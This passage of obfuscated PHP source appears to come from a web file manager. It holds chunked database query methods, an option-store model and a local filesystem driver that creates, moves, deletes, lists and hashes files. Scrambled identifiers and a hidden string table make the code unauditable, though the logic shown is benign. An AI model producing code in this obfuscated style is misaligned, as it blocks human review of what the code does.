$ã½×éÓÉ[327])) { for ($¬³ı¦¼Ë = 0; $¬³ı¦¼Ë < count($¹ŒìØ); $¬³ı¦¼Ë += $Şü‘ğó¿) { $°Ñ›ôâ´ = array_slice($¹ŒìØ, $¬³ı¦¼Ë, $Şü‘ğó¿); if (!is_array($°Ñ›ôâ´) || count($°Ñ›ôâ´) == 0) { break; } $ÆñˆÒ‰ = $this->db->insertAll($°Ñ›ôâ´, $Ú¦€è»ˆ, $ØÜ“èÄ); $this->chunkEventCheck(count($°Ñ›ôâ´)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¹ŒìØ as $“Ø¦²• => $¦•ÈÙÓ) { $ÆñˆÒ‰ = $this->db->insert($¦•ÈÙÓ, $Ú¦€è»ˆ, $ØÜ“èÄ); } $this->commit(); } if (!1 !== $ÆñˆÒ‰) { $«—éÂ = $this->getLastInsID(); if ($«—éÂ) { return $«—éÂ; } } return $ÆñˆÒ‰; } public function save($ÀÌå’‡€ = '', $´×ç¯ƒò = array()) { $ÁùÄÆÏ© =& $_SERVER[•€áå–Õ]; $™õ™îŒ = self::SQL_WHERE_IN_CHUNK; $³ ö€¹ = $this->optionsValue(); $‰ãİÑã‹ = $this->findWhereField($³ ö€¹); if (!$‰ãİÑã‹) { return parent::save($ÀÌå’‡€, $´×ç¯ƒò); } $÷Üê¯§ô = 0; $€”ã˜ß˜ = $³ ö€¹[$ÁùÄÆÏ©[330]][$‰ãİÑã‹][1]; $€”ã˜ß˜ = is_array($€”ã˜ß˜) ? $€”ã˜ß˜ : array(); $ª¡²Àôš = count($€”ã˜ß˜); for ($Öˆ¯“‡ = 0; $Öˆ¯“‡ < $ª¡²Àôš; $Öˆ¯“‡ += $™õ™îŒ) { $è ëïÔò = array_slice($€”ã˜ß˜, $Öˆ¯“‡, $™õ™îŒ); if (!is_array($è ëïÔò) || count($è ëïÔò) == 0) { break; } $³ ö€¹[$ÁùÄÆÏ©[330]][$‰ãİÑã‹][1] = $è ëïÔò; $this->optionsValue($³ ö€¹); $÷Üê¯§ô += parent::save($ÀÌå’‡€, $´×ç¯ƒò); $this->chunkEventCheck(count($è ëïÔò)); } $this->chunkEventSet(); return $÷Üê¯§ô; } public function add($É•½¼Ÿº = '', $¬üÊ¨ÄŠ = array(), $¹„¨ƒÔ• = false) { if ($this->addTaskStatus && is_array($É•½¼Ÿº)) { $this->addTaskData[] = $É•½¼Ÿº; return; } return parent::add($É•½¼Ÿº, $¬üÊ¨ÄŠ, $¹„¨ƒÔ•); } public function parseWhereLike($èğ›­ÎŒ, $œŸç™”ğ = '', $Æë‡à±Ä = false, &$Ãúµ˜‰× = false) { $‰¤ ñÅ­ =& $_SERVER[•€áå–Õ]; $ê³ÔÍ–» = $GLOBALS[$‰¤ ñÅ­[16]][$‰¤ ñÅ­[436]]; if (!$ê³ÔÍ–»[$‰¤ ñÅ­[437]]) { return $èğ›­ÎŒ; } if (!is_array($èğ›­ÎŒ)) { return $èğ›­ÎŒ; } $ŠŠó·—´ = array(); $¯úû½–ö = 0; foreach ($èğ›­ÎŒ as $˜ßì‰× => $÷—èÛ“£) { if (is_array($÷—èÛ“£) && count($÷—èÛ“£) == 2 && $÷—èÛ“£[0] == $‰¤ ñÅ­[438] && is_string($÷—èÛ“£[1]) && substr($÷—èÛ“£[1], 0, 1) == $‰¤ ñÅ­[439] && substr($÷—èÛ“£[1], strlen($÷—èÛ“£[1]) - 1, 1) == $‰¤ ñÅ­[439]) { $Ãúµ˜‰× = !0; $‘Ì¸÷µ„ = is_string($˜ßì‰×) ? $˜ßì‰× : $œŸç™”ğ; $Ëû«Ô¾ê = substr($÷—èÛ“£[1], 1, strlen($÷—èÛ“£[1]) - 2); $Ëû«Ô¾ê = $this->db->escapeString($Ëû«Ô¾ê); if (!strpos($‘Ì¸÷µ„, $‰¤ ñÅ­[20])) { $‘Ì¸÷µ„ = $‰¤ ñÅ­[440] . $‘Ì¸÷µ„ . $‰¤ ñÅ­[440]; } $ºœË™Ú» = $‰¤ ñÅ­[215] . $Ëû«Ô¾ê . $‰¤ ñÅ­[215]; $Ëû«Ô¾ê = str_replace(array($‰¤ ñÅ­[20], $‰¤ ñÅ­[441], $‰¤ ñÅ­[21]), $‰¤ ñÅ­[442], $Ëû«Ô¾ê); if ($ê³ÔÍ–»[$‰¤ ñÅ­[443]]) { $ºœË™Ú» = $‰¤ ñÅ­[444] . $Ëû«Ô¾ê . $‰¤ ñÅ­[445]; if ($ê³ÔÍ–»[$‰¤ ñÅ­[446]]) { $ºœË™Ú» = $‰¤ ñÅ­[445] . $Ëû«Ô¾ê . $‰¤ ñÅ­[444]; } } $ŠŠó·—´[$¯úû½–ö] = $‰¤ ñÅ­[447] . $‘Ì¸÷µ„ . $‰¤ ñÅ­[448] . $ºœË™Ú» . $‰¤ ñÅ­[449]; $¯úû½–ö++; continue; } if (is_array($÷—èÛ“£)) { $œŸç™”ğ = is_string($˜ßì‰×) ? $˜ßì‰× : $œŸç™”ğ; $÷—èÛ“£ = $this->parseWhereLike($÷—èÛ“£, $œŸç™”ğ, !0, $Ãúµ˜‰×); } if (is_numeric($˜ßì‰×)) { $ŠŠó·—´[$¯úû½–ö] = $÷—èÛ“£; $¯úû½–ö++; } else { $ŠŠó·—´[$˜ßì‰×] = $÷—èÛ“£; } } if ($Ãúµ˜‰× && !$Æë‡à±Ä) { } return $ŠŠó·—´; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($‹¤êµ›É = array()) { $Í‚ş­æÚ =& $_SERVER[•€áå–Õ]; $ÄûÏûæú = self::SQL_WHERE_IN_CHUNK; $èËÒÅÛ˜ = $this->optionsValue(); $Š£ˆ¼·Ê = $this->findWhereField($èËÒÅÛ˜); if (!$Š£ˆ¼·Ê || isset($èËÒÅÛ˜[$Í‚ş­æÚ[347]]) || isset($èËÒÅÛ˜[$Í‚ş­æÚ[408]])) { return parent::select($‹¤êµ›É); } $çñÆ•‰õ = $èËÒÅÛ˜[$Í‚ş­æÚ[330]][$Š£ˆ¼·Ê][1]; $çñÆ•‰õ = is_array($çñÆ•‰õ) ? $çñÆ•‰õ : array(); $‰ï†³ØÙ = null; for ($”ÏÜ‰›è = 0; $”ÏÜ‰›è < count($çñÆ•‰õ); $”ÏÜ‰›è += $ÄûÏûæú) { $ƒ”‹Ù³Æ = array_slice($çñÆ•‰õ, $”ÏÜ‰›è, $ÄûÏûæú); if (!is_array($ƒ”‹Ù³Æ) || count($ƒ”‹Ù³Æ) == 0) { break; } $èËÒÅÛ˜[$Í‚ş­æÚ[330]][$Š£ˆ¼·Ê][1] = $ƒ”‹Ù³Æ; $this->optionsValue($èËÒÅÛ˜); $¡Î·ÛÒ÷ = parent::select($‹¤êµ›É); if (!$¡Î·ÛÒ÷) { continue; } $‰ï†³ØÙ = is_array($‰ï†³ØÙ) ? $‰ï†³ØÙ : array(); $‰ï†³ØÙ = array_merge($‰ï†³ØÙ, $¡Î·ÛÒ÷); } return $‰ï†³ØÙ; } public function delete($ø¶¯²Œ = array()) { $µÍóª› =& $_SERVER[•€áå–Õ]; $¡ö™Â³ª = self::SQL_WHERE_IN_CHUNK; $ò…¼¨ = $this->optionsValue(); $‚›ŸÅõı = $this->findWhereField($ò…¼¨); if (!$‚›ŸÅõı) { return parent::delete($ø¶¯²Œ); } $ˆÚä¤û = 0; $’¸Ò¹ªˆ = $ò…¼¨[$µÍóª›[330]][$‚›ŸÅõı][1]; $’¸Ò¹ªˆ = is_array($’¸Ò¹ªˆ) ? $’¸Ò¹ªˆ : array(); for ($è±°’ò = 0; $è±°’ò < count($’¸Ò¹ªˆ); $è±°’ò += $¡ö™Â³ª) { $÷ùœ’¡Ñ = array_slice($’¸Ò¹ªˆ, $è±°’ò, $¡ö™Â³ª); if (!is_array($÷ùœ’¡Ñ) || count($÷ùœ’¡Ñ) == 0) { break; } $ò…¼¨[$µÍóª›[330]][$‚›ŸÅõı][1] = $÷ùœ’¡Ñ; $this->optionsValue($ò…¼¨); $ˆÚä¤û += parent::delete($ø¶¯²Œ); } return $ˆÚä¤û; } private function findWhereField($ «Ú›û¾) { $œ˜ÂÁõ =& $_SERVER[•€áå–Õ]; $Şöš¯Éœ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ «Ú›û¾) || !is_array($ «Ú›û¾[$œ˜ÂÁõ[330]])) { return !1; } foreach ($ «Ú›û¾[$œ˜ÂÁõ[330]] as $ Ş’¡Û => $„÷ÚÉß) { if (is_array($„÷ÚÉß) && isset($„÷ÚÉß[0]) && is_string($„÷ÚÉß[0]) && strtolower($„÷ÚÉß[0]) == $œ˜ÂÁõ[17] && is_array($„÷ÚÉß[1]) && count($„÷ÚÉß[1]) > $Şöš¯Éœ) { ignore_timeout(); return $ Ş’¡Û; } } return !1; } public function setMasterDB($ ŸãŠÃà = true) { think_config($_SERVER[•€áå–Õ][450], $ ŸãŠÃà); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\155\x4f\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($ƒÚ™¬¥ = false, $½åšµƒ– = "\x6d\157\x64\x69\146\171\x54\151\155\145", $¸Ñİì˜ = false) { $’•”§àé = Model($this->modelType)->get(!1, $this->optionType, !0); $ÅÙÎ¹áÏ = array_values($’•”§àé); if ($ÅÙÎ¹áÏ && $ÅÙÎ¹áÏ[0] && !is_array($ÅÙÎ¹áÏ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $’•”§àé = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$’•”§àé) { return $ƒÚ™¬¥ ? null : array(); } if (!$ƒÚ™¬¥) { $’•”§àé = array_filter(array_values($’•”§àé)); return array_sort_by($’•”§àé, $½åšµƒ–, $¸Ñİì˜); } return $’•”§àé[$_SERVER[•€áå–Õ][451] . $ƒÚ™¬¥]; } public function insert($Ãäô“…») { $‹Í°Ôİä =& $_SERVER[•€áå–Õ]; $Ãäô“…» = array_field_key($Ãäô“…», $this->field); $Ä¯šôä¸ = Model($this->modelType)->get($‹Í°Ôİä[452], $this->optionType . $‹Í°Ôİä[453]); $Ä¯šôä¸ = $Ä¯šôä¸ ? $Ä¯šôä¸ : 0; $Ãäô“…»[$‹Í°Ôİä[454]] = ++$Ä¯šôä¸; $Ãäô“…»[$‹Í°Ôİä[227]] = time(); $Ãäô“…»[$‹Í°Ôİä[97]] = time(); Model($this->modelType)->set($‹Í°Ôİä[452], $Ä¯šôä¸, $this->optionType . $‹Í°Ôİä[453]); Model($this->modelType)->set($‹Í°Ôİä[451] . $Ä¯šôä¸, $Ãäô“…», $this->optionType); return $Ä¯šôä¸; } public function update($À ¼Èıë, $„’Ö¼Ş) { $ñÚŠÎç– =& $_SERVER[•€áå–Õ]; $„’Ö¼Ş = array_field_key($„’Ö¼Ş, $this->field); $íÈÄÄ¡Ş = $this->listData($À ¼Èıë); if (!$íÈÄÄ¡Ş || !$À ¼Èıë) { return !1; } $„’Ö¼Ş = array_merge($íÈÄÄ¡Ş, $„’Ö¼Ş); $„’Ö¼Ş[$ñÚŠÎç–[97]] = time(); return Model($this->modelType)->set($ñÚŠÎç–[451] . $À ¼Èıë, $„’Ö¼Ş, $this->optionType); } public function remove($ÉÆ·ŒÚ®) { if (!$ÉÆ·ŒÚ®) { return !1; } return Model($this->modelType)->remove($_SERVER[•€áå–Õ][451] . $ÉÆ·ŒÚ®, $this->optionType); } public function clear() { $ˆÚÛ˜É¡ =& $_SERVER[•€áå–Õ]; Model($this->modelType)->remove($ˆÚÛ˜É¡[452], $this->optionType . $ˆÚÛ˜É¡[453]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ˆÜ÷´Ê, $÷ßµãé) { if (!$÷ßµãé) { return !1; } $áµìÍğÖ = $this->listData(); $áµìÍğÖ = array_to_keyvalue($áµìÍğÖ, $ˆÜ÷´Ê); return isset($áµìÍğÖ[$÷ßµãé]) ? $áµìÍğÖ[$÷ßµãé] : !1; } public function findByName($•À®†Ÿ) { return $this->findByKey($_SERVER[•€áå–Õ][42], $•À®†Ÿ); } protected function resetData($…Â‚È—²) { $¼Ù§í¾Ê =& $_SERVER[•€áå–Õ]; $…Â‚È—² = is_array($…Â‚È—²) ? $…Â‚È—² : array(); $ÍÁÜ ë = array(); for ($‚î¡¦ı» = 0; $‚î¡¦ı» < count($…Â‚È—²); $‚î¡¦ı»++) { $ÍÁÜ ë[$¼Ù§í¾Ê[451] . $…Â‚È—²[$‚î¡¦ı»][$¼Ù§í¾Ê[454]]] = $…Â‚È—²[$‚î¡¦ı»]; } return Model($this->modelType)->set($ÍÁÜ ë, !1, $this->optionType); } private function getAutoName($€‚Ç÷ò) { $ÀÃ’Ã£Ô = array_to_keyvalue($this->listData(), $_SERVER[•€áå–Õ][42]); if (!$ÀÃ’Ã£Ô || !isset($ÀÃ’Ã£Ô[$€‚Ç÷ò])) { return $€‚Ç÷ò; } for ($°¡Ï’—Õ = 1; $°¡Ï’—Õ < count($ÀÃ’Ã£Ô); $°¡Ï’—Õ++) { $î—¦ÅÏ‰ = $€‚Ç÷ò . "\50{$°¡Ï’—Õ}\51"; if (!isset($ÀÃ’Ã£Ô[$î—¦ÅÏ‰])) { return $î—¦ÅÏ‰; } } return $î—¦ÅÏ‰; } } goto Fİª†Ü›­; cÑàãÒ—ˆ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÛÖĞÉô°) { if (substr($ÛÖĞÉô°, 0, 2) == $_SERVER[•€áå–Õ][1395]) { $ÛÖĞÉô° = BASIC_PATH . substr($ÛÖĞÉô°, 2); } return $ÛÖĞÉô°; } public function iconvApp($áÀ‹®º) { $«İ·Ä =& $_SERVER[•€áå–Õ]; global $config; return $this->iconvTo($áÀ‹®º, $config[$«İ·Ä[1393]], $config[$«İ·Ä[1392]]); } public function iconvSystem($ôüªº×ï) { $—Ğá­§ =& $_SERVER[•€áå–Õ]; global $config; return $this->iconvTo($ôüªº×ï, $config[$—Ğá­§[1392]], $config[$—Ğá­§[1393]]); } public function getPathOuter($åå˜ü“º) { $™Ë‹şÁí =& $_SERVER[•€áå–Õ]; $Œ¨®İ‡Ä = $this->iconvApp($this->pathBase); $åå˜ü“º = $this->iconvApp($åå˜ü“º); if (substr($Œ¨®İ‡Ä, 0, 2) == $™Ë‹şÁí[1395]) { $Œ¨®İ‡Ä = BASIC_PATH . substr($Œ¨®İ‡Ä, 2); } if (substr($åå˜ü“º, 0, 2) == $™Ë‹şÁí[1395]) { $åå˜ü“º = BASIC_PATH . substr($åå˜ü“º, 2); } $Œ¨®İ‡Ä = KodIO::clear($Œ¨®İ‡Ä); $åå˜ü“º = KodIO::clear($åå˜ü“º); $åå˜ü“º = substr($åå˜ü“º, strlen($Œ¨®İ‡Ä)); if (empty($this->pathDriver)) { return $åå˜ü“º; } return $this->pathDriver . $™Ë‹şÁí[18] . ltrim($åå˜ü“º, $™Ë‹şÁí[18]); } public function mkfile($Ä’’òé¦, $ÈÙµÃÑÃ = '', $¤å¡Î³ = REPEAT_RENAME) { $Ä’’òé¦ = $this->iconvSystem($Ä’’òé¦); @touch($Ä’’òé¦); if ($ÈÙµÃÑÃ) { file_put_contents($Ä’’òé¦, $ÈÙµÃÑÃ); } @chmod($Ä’’òé¦, $this->pathAuth); return is_file($Ä’’òé¦) ? $this->getPathOuter($Ä’’òé¦) : !1; } public function mkdir($ªµ°Ÿ¯œ, $ó€“³ÜÔ = REPEAT_SKIP) { $ªµ°Ÿ¯œ = $this->iconvSystem($ªµ°Ÿ¯œ); if (is_dir($ªµ°Ÿ¯œ)) { return $this->getPathOuter($ªµ°Ÿ¯œ); } @mkdir($ªµ°Ÿ¯œ, $this->pathAuth, !0); @chmod($ªµ°Ÿ¯œ, $this->pathAuth); return is_dir($ªµ°Ÿ¯œ) ? $this->getPathOuter($ªµ°Ÿ¯œ) : !1; } public function copyFile($éàâüì, $Ú¹å‡âØ) { $this->mkdir($this->pathFather($Ú¹å‡âØ)); $éàâüì = $this->iconvSystem($éàâüì); $Ú¹å‡âØ = $this->iconvSystem($Ú¹å‡âØ); $™üÛ’˜ˆ = copy_64($éàâüì, $Ú¹å‡âØ); @chmod($Ú¹å‡âØ, $this->pathAuth); return $™üÛ’˜ˆ ? $this->getPathOuter($Ú¹å‡âØ) : !1; } public function moveFile($èÛÈ„Ôé, $ı¿¿¤ĞŸ) { $this->mkdir($this->pathFather($ı¿¿¤ĞŸ)); $èÛÈ„Ôé = $this->iconvSystem($èÛÈ„Ôé); $ı¿¿¤ĞŸ = $this->iconvSystem($ı¿¿¤ĞŸ); $±îÔõ = intval(@rename($èÛÈ„Ôé, $ı¿¿¤ĞŸ)); if (!$±îÔõ) { if ($±îÔõ = intval(@copy_64($èÛÈ„Ôé, $ı¿¿¤ĞŸ))) { @unlink($èÛÈ„Ôé); } } @chmod($ı¿¿¤ĞŸ, $this->pathAuth); return $±îÔõ ? $this->getPathOuter($ı¿¿¤ĞŸ) : !1; } public function movePath($ş„«ˆš , $©¯Ô¶€», $µ™§”Ô = false) { $¦³ß¯‡Ï =& $_SERVER[•€áå–Õ]; $ş„«ˆš  = $this->iconvSystem($ş„«ˆš ); $©¯Ô¶€» = $this->iconvSystem($©¯Ô¶€»); $²íê†¹ = rtrim($©¯Ô¶€», $¦³ß¯‡Ï[18]) . $¦³ß¯‡Ï[18] . ($µ™§”Ô ? $µ™§”Ô : get_path_this($ş„«ˆš )); if (file_exists($²íê†¹)) { return !1; } $ëã³£öá = intval(@rename($ş„«ˆš , $²íê†¹)); $ëã³£öá = file_exists($²íê†¹); return $ëã³£öá ? $this->getPathOuter($²íê†¹) : !1; } public function delFile($ëˆ¬Ş¶) { $ëˆ¬Ş¶ = $this->iconvSystem($ëˆ¬Ş¶); if (!@unlink($ëˆ¬Ş¶)) { @chmod($ëˆ¬Ş¶, $this->pathAuth); if (!@unlink($ëˆ¬Ş¶)) { return !1; } } else { return !0; } } public function delFolder($Ã¬Ç§û) { $Ã°áÎ½‹ =& $_SERVER[•€áå–Õ]; $Ã¬Ç§û = $this->iconvSystem($Ã¬Ç§û); if (!is_dir($Ã¬Ç§û)) { return !0; } if (!($î©Ñ·ö“ = opendir($Ã¬Ç§û))) { return !1; } while (($ùïÆéëç = readdir($î©Ñ·ö“)) !== !1) { if ($ùïÆéëç == $Ã°áÎ½‹[20] || $ùïÆéëç == $Ã°áÎ½‹[1319]) { continue; } $£ç¥Ë£ = $Ã¬Ç§û . $Ã°áÎ½‹[18] . $ùïÆéëç; if (is_file($£ç¥Ë£) || is_link($£ç¥Ë£)) { if (!unlink($£ç¥Ë£)) { chmod($£ç¥Ë£, $this->pathAuth); if (!unlink($£ç¥Ë£)) { return !1; } } } else { if (is_dir($£ç¥Ë£)) { chmod($£ç¥Ë£, $this->pathAuth); $£ç¥Ë£ = $this->iconvApp($£ç¥Ë£); if (!$this->delFolder($£ç¥Ë£)) { return !1; } } } } closedir($î©Ñ·ö“); return rmdir($Ã¬Ç§û); } public function rename($‚ŞÒõ, $ãó–”ıƒ) { $²¢…ñ¢¬ =& $_SERVER[•€áå–Õ]; $ÅªßÆÂ = $this->fileNameAuto($this->pathFather($‚ŞÒõ), $ãó–”ıƒ); $ÅªßÆÂ = $this->iconvSystem($ÅªßÆÂ); $‚ŞÒõ = $this->iconvSystem($‚ŞÒõ); $ôÄ‘ËàÎ = $this->pathFather($‚ŞÒõ); $î¹˜£‹õ = rtrim($ôÄ‘ËàÎ, $²¢…ñ¢¬[18]) . $²¢…ñ¢¬[18] . $ÅªßÆÂ; $À˜ÃÅëö = @rename($‚ŞÒõ, $î¹˜£‹õ); $î¹˜£‹õ = $this->iconvApp($î¹˜£‹õ); return $À˜ÃÅëö ? $this->getPathOuter($î¹˜£‹õ) : !1; } public function size($ûûÚéÅï) { $ûûÚéÅï = $this->iconvSystem($ûûÚéÅï); return filesize_64($ûûÚéÅï); } public function info($ÈıÏ÷³ú) { $ÈıÏ÷³ú = $this->iconvSystem($ÈıÏ÷³ú); if ($this->isFolder($ÈıÏ÷³ú)) { return $this->folderInfo($ÈıÏ÷³ú); } else { if ($this->isFile($ÈıÏ÷³ú)) { return $this->fileInfo($ÈıÏ÷³ú); } } return !1; } protected function infoChildren($÷ÁÅ„ûÏ, &$üûçãÇı, $—µÁ£ = true) { $¾·¹Ï =& $_SERVER[•€áå–Õ]; check_abort_echo(); $÷ÁÅ„ûÏ = rtrim($÷ÁÅ„ûÏ, $¾·¹Ï[18]) . $¾·¹Ï[18]; if ($—µÁ£) { $÷ÁÅ„ûÏ = $this->iconvSystem($÷ÁÅ„ûÏ); } if (!($ê¦’‡æ˜ = @opendir($÷ÁÅ„ûÏ))) { return; } while (($¾…àĞãò = readdir($ê¦’‡æ˜)) !== !1) { if ($¾…àĞãò == $¾·¹Ï[20] || $¾…àĞãò == $¾·¹Ï[1319]) { continue; } $¿³ÅƒÜ¸ = $÷ÁÅ„ûÏ . $¾…àĞãò; if (is_file($¿³ÅƒÜ¸) || is_link($¿³ÅƒÜ¸)) { $üûçãÇı[$¾·¹Ï[89]]++; $üûçãÇı[$¾·¹Ï[88]] += filesize_64($¿³ÅƒÜ¸); } else { if (is_dir($¿³ÅƒÜ¸)) { $üûçãÇı[$¾·¹Ï[90]]++; $this->infoChildren($¿³ÅƒÜ¸, $üûçãÇı, !1); } } } closedir($ê¦’‡æ˜); } private function folderInfo($äõæ–°Î, $ä†öÀÔš = false) { $¾¾äı =& $_SERVER[•€áå–Õ]; $äõæ–°Î = rtrim($äõæ–°Î, $¾¾äı[18]) . $¾¾äı[18]; $¶æ¾ş—Å = $this->iconvApp($this->pathThis($äõæ–°Î)); if ($ä†öÀÔš) { return array($¾¾äı[42] => $¶æ¾ş—Å, $¾¾äı[96] => $this->getPathOuter($äõæ–°Î), $¾¾äı[43] => $¾¾äı[87]); } $¬õ¾ò˜” = array($¾¾äı[42] => $¶æ¾ş—Å, $¾¾äı[96] => $this->getPathOuter($äõæ–°Î), $¾¾äı[43] => $¾¾äı[87], $¾¾äı[227] => @filectime($äõæ–°Î), $¾¾äı[97] => @filemtime($äõæ–°Î), $¾¾äı[1404] => @fileatime($äõæ–°Î), $¾¾äı[1405] => is_readable($äõæ–°Î), $¾¾äı[1406] => is_writable($äõæ–°Î), $¾¾äı[1407] => get_mode($äõæ–°Î)); return $¬õ¾ò˜”; } private function fileInfo($¿®äî™Ú, $ÌÅıËåò = false) { $û„³È¹ =& $_SERVER[•€áå–Õ]; $¸Ï§ªú¦ = $this->iconvApp($this->pathThis($¿®äî™Ú)); if ($ÌÅıËåò) { return array($û„³È¹[42] => $¸Ï§ªú¦, $û„³È¹[96] => $this->getPathOuter($¿®äî™Ú), $û„³È¹[43] => $û„³È¹[226], $û„³È¹[88] => $this->size($¿®äî™Ú), $û„³È¹[187] => $this->ext($¸Ï§ªú¦)); } $Øå§§Á  = array($û„³È¹[42] => $¸Ï§ªú¦, $û„³È¹[96] => $this->getPathOuter($¿®äî™Ú), $û„³È¹[43] => $û„³È¹[226], $û„³È¹[227] => @filectime($¿®äî™Ú), $û„³È¹[97] => @filemtime($¿®äî™Ú), $û„³È¹[1404] => @fileatime($¿®äî™Ú), $û„³È¹[88] => $this->size($¿®äî™Ú), $û„³È¹[187] => $this->ext($¸Ï§ªú¦), $û„³È¹[1405] => is_readable($¿®äî™Ú), $û„³È¹[1406] => is_writable($¿®äî™Ú), $û„³È¹[1407] => get_mode($¿®äî™Ú)); return $Øå§§Á ; } public function exist($¿¤í¿ï) { $¿¤í¿ï = $this->iconvSystem($¿¤í¿ï); return @file_exists($¿¤í¿ï); } public function isFile($ÆÈ¼¥æ¶) { $ÆÈ¼¥æ¶ = $this->iconvSystem($ÆÈ¼¥æ¶); return @is_file($ÆÈ¼¥æ¶); } public function isFolder($†ØÔĞùß) { $†ØÔĞùß = $this->iconvSystem($†ØÔĞùß); return @is_dir($†ØÔĞùß); } public function listPath($€’Ş“ÄÍ, $øÅ¾çã = false) { $Ÿúõ¾Ø =& $_SERVER[•€áå–Õ]; $€’Ş“ÄÍ = $this->iconvSystem($€’Ş“ÄÍ); $€’Ş“ÄÍ = rtrim($€’Ş“ÄÍ, $Ÿúõ¾Ø[18]) . $Ÿúõ¾Ø[18]; $Óæİí  = array($Ÿúõ¾Ø[94] => array(), $Ÿúõ¾Ø[95] => array()); if (!($ïóŒà± = @opendir($€’Ş“ÄÍ))) { return $Óæİí ; } while (($‘½¯ˆãÛ = readdir($ïóŒà±)) !== !1) { if ($‘½¯ˆãÛ == $Ÿúõ¾Ø[20] || $‘½¯ˆãÛ == $Ÿúõ¾Ø[1319]) { continue; } $ÍÓ‰óöê = $€’Ş“ÄÍ . $‘½¯ˆãÛ; if (is_file($ÍÓ‰óöê)) { $Óæİí [$Ÿúõ¾Ø[95]][] = $this->fileInfo($ÍÓ‰óöê, $øÅ¾çã); } else { $Óæİí [$Ÿúõ¾Ø[94]][] = $this->folderInfo($ÍÓ‰óöê, $øÅ¾çã); } } closedir($ïóŒà±); return $Óæİí ; } public function listAll($ğıàÖÁß, &$èƒÄÀ–  = array()) { $ÅúÉİıİ =& $_SERVER[•€áå–Õ]; $ğıàÖÁß = $this->iconvSystem($ğıàÖÁß); $ğıàÖÁß = rtrim($ğıàÖÁß, $ÅúÉİıİ[18]) . $ÅúÉİıİ[18]; if (!($Š¦‡¯­Ò = @opendir($ğıàÖÁß))) { return $èƒÄÀ– ; } while (($°óÖåğÁ = readdir($Š¦‡¯­Ò)) !== !1) { if ($°óÖåğÁ == $ÅúÉİıİ[20] || $°óÖåğÁ == $ÅúÉİıİ[1319]) { continue; } $§ı­Ê¹¸ = $ğıàÖÁß . $°óÖåğÁ; $²İê½Ø = is_dir($§ı­Ê¹¸) && !is_link($§ı­Ê¹¸) ? 1 : 0; $§ı­Ê¹¸ = $²İê½Ø ? $§ı­Ê¹¸ . $ÅúÉİıİ[18] : $§ı­Ê¹¸; $èƒÄÀ– [] = array($ÅúÉİıİ[96] => $§ı­Ê¹¸, $ÅúÉİıİ[87] => $²İê½Ø, $ÅúÉİıİ[97] => intval(@filemtime($§ı­Ê¹¸)), $ÅúÉİıİ[88] => $²İê½Ø ? 0 : intval($this->size($§ı­Ê¹¸))); if ($²İê½Ø) { $this->listAll($§ı­Ê¹¸, $èƒÄÀ– ); } } closedir($Š¦‡¯­Ò); return $èƒÄÀ– ; } public function has($»‘Ô¢¾, $ê§ÇÚé‰ = false, $ÃÂ‹ÒÈ = true) { $¢Éï¹Ù =& $_SERVER[•€áå–Õ]; $»‘Ô¢¾ = $this->iconvSystem($»‘Ô¢¾); $»‘Ô¢¾ = rtrim($»‘Ô¢¾, $¢Éï¹Ù[18]) . $¢Éï¹Ù[18]; if (!($®¯˜»˜¿ = @opendir($»‘Ô¢¾))) { return !1; } $ß™œè¬Ø = 0; $ÂıÒû¿É = 0; $ÙÂØâœÀ = 0; while (($¿ªœŒ×µ = readdir($®¯˜»˜¿)) !== !1) { if ($¿ªœŒ×µ == $¢Éï¹Ù[20] || $¿ªœŒ×µ == $¢Éï¹Ù[1319]) { continue; } $‚¬ã­ˆ« = $»‘Ô¢¾ . $¿ªœŒ×µ; if ($ê§ÇÚé‰) { $ÙÂØâœÀ++; if (@is_file($‚¬ã­ˆ«)) { $ß™œè¬Ø++; } else { $ÂıÒû¿É++; } if ($ÙÂØâœÀ > 10000) { break; } continue; } if ($ÃÂ‹ÒÈ) { if (@is_file($‚¬ã­ˆ«)) { return !0; } } else { if (@is_dir($‚¬ã­ˆ« . $¢Éï¹Ù[18])) { return !0; } } } closedir($®¯˜»˜¿); if ($ê§ÇÚé‰) { return array($¢Éï¹Ù[235] => $ß™œè¬Ø, $¢Éï¹Ù[236] => $ÂıÒû¿É); } return !1; } public function hashSimple($ÅëÍÎú¯) { $”õÀŞı =& $_SERVER[•€áå–Õ]; if (!$ÅëÍÎú¯) { return md5($”õÀŞı[22]); } $ÅëÍÎú¯ = $this->iconvSystem($ÅëÍÎú¯); $Ğ¦Ö¬ğà = $this->size($ÅëÍÎú¯); $üáÌã›› = 200; $ƒ¿›…¨ğ = 50; if ($Ğ¦Ö¬ğà <= $üáÌã›› * $ƒ¿›…¨ğ) { return $this->hashMd5($ÅëÍÎú¯) . $Ğ¦Ö¬ğà; } $„¶åâÍ = $”õÀŞı[22]; $³¯ôë = intval($Ğ¦Ö¬ğà / $ƒ¿›…¨ğ); $“¾ëÖ¬  = fopen($ÅëÍÎú¯, $”õÀŞı[1408]); if (!$“¾ëÖ¬ ) { return $„¶åâÍ; } for ($“ê¤İêû = 0; $“ê¤İêû < $ƒ¿›…¨ğ; $“ê¤İêû++) { fseek_64($“¾ëÖ¬ , $³¯ôë * $“ê¤İêû); $„¶åâÍ .= fread($“¾ëÖ¬ , $üáÌã››); } fseek_64($“¾ëÖ¬ , $Ğ¦Ö¬ğà - $üáÌã››); $„¶åâÍ .= fread($“¾ëÖ¬ , $üáÌã››); fclose($“¾ëÖ¬ ); return md5($„¶åâÍ) . $Ğ¦Ö¬ğà; } public function getContent($†â•¼ş) { $†â•¼ş = $this->iconvSystem($†â•¼ş); return file_get_contents($†â•¼ş); } public function setContent($ßøóú®, $­Û­¤ÁÊ = '') { $ßøóú® = $this->iconvSystem($ßøóú®); $çš‹Ë²› = @file_put_contents($ßøóú®, $­Û­¤ÁÊ, LOCK_EX); clearstatcache(); 